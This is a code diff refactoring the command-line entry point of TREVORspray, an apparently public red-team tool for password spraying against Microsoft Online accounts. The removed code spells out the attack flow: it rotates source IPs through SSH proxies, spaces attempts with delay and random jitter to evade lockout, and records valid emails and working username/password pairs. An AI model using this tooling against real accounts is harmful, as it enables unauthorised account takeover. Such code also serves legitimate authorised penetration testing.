@@ -3,106 +3,25 @@
 # by TheTechromancer
 
 import sys
-import time
-import random
 import logging
 import argparse
-from lib import util
 from lib import logger
-from time import sleep
-from lib.proxy import *
-from lib.errors import *
-from lib.discover import *
+import lib.util as util
 from shutil import which
 from getpass import getpass
-from lib.msol import MSOLSpray
+from lib.sprayer import TrevorSpray
+from lib.proxy import SSHLoadBalancer
+from lib.errors import TREVORSprayError
 
 
 log = logging.getLogger('trevorspray.cli')
 
-trevorspray_dir = Path.home() / '.trevorspray'
-trevorspray_dir.mkdir(exist_ok=True)
-
 
 def main(options):
 
-    if options.recon:
-        for domain in options.recon:
-            discovery = DomainDiscovery(domain)
-            discovery.recon()
-            consider = 'You can also try:\n'
-            for suggestion in discovery.suggest():
-                consider += f' - {suggestion}\n'
-            log.info(consider)
-
-    if options.delay and options.ssh:
-        num_ips = len(options.ssh) + (0 if options.no_current_ip else 1)
-        new_delay = options.delay / num_ips
-        log.debug(f'Adjusting delay for {num_ips:,} IPs: {options.delay:.2f}s --> {new_delay:.2f}s per IP')
-        options.delay = new_delay
-
-    if (options.passwords and options.emails):
-
-        valid_emails_file = str(trevorspray_dir / 'valid_emails.txt')
-        tried_logins_file = str(trevorspray_dir / 'tried_logins.txt')
-        valid_logins_file = str(trevorspray_dir / 'valid_logins.txt')
-
-        load_balancer = SSHLoadBalancer(
-            hosts=options.ssh,
-            key=options.key,
-            key_pass=options.key_pass,
-            base_port=options.base_port,
-            current_ip=(not options.no_current_ip)
-        )
-
-        for password in options.passwords:
-
-            sprayer = MSOLSpray(
-                emails=options.emails,
-                password=password,
-                url=options.url,
-                force=options.force,
-                load_balancer=load_balancer,
-                verbose=options.verbose,
-                skip_logins=util.read_file(tried_logins_file)
-            )
-
-            try:
-
-                load_balancer.start()
-
-                for proxy in load_balancer.proxies:
-                    log.debug(f'Proxy: {proxy}')
-
-                log.info(f'Spraying {len(options.emails):,} users against {options.url} at {time.ctime()}')
-                log.info(f'Command: {" ".join(sys.argv)}')
-
-                for i,result in enumerate(sprayer.spray()):
-                    print(f'       Sprayed {i+1:,} accounts\r', end='', flush=True)
-                    if options.delay or options.jitter:
-                        delay = float(options.delay)
-                        jitter = random.random() * options.jitter
-                        delay += jitter
-                        if options.verbose and delay > 0:
-                            log.debug(f'Sleeping for {options.delay:,} seconds ({options.delay:.2f}s delay + {jitter:.2f}s jitter)')
-                        sleep(delay)
-
-                log.info(f'Finished spraying {len(options.emails):,} users against {options.url} at {time.ctime()}')
-                for success in sprayer.valid_logins:
-                    log.critical(success)
-
-            finally:
-                load_balancer.stop()
-                # write valid emails
-                util.update_file(valid_emails_file, sprayer.valid_emails)
-                log.debug(f'{len(sprayer.valid_emails):,} valid emails written to {valid_emails_file}')
-                # write attempted logins
-                util.update_file(tried_logins_file, sprayer.tried_logins)
-                # write valid logins
-                util.update_file(valid_logins_file, sprayer.valid_logins)
-                log.debug(f'{len(sprayer.valid_logins):,} valid user/pass combos written to {valid_logins_file}')
-
-
+    log.info(f'Command: {" ".join(sys.argv)}')
+    sprayer = TrevorSpray(options)
+    sprayer.go()
 
 
 if __name__ == '__main__':
@@ -148,7 +67,6 @@ if __name__ == '__main__':
             options.key_pass = getpass('SSH key password (press enter if none): ')
 
         main(options)
-
 
     except argparse.ArgumentError as e:
         log.error(e)
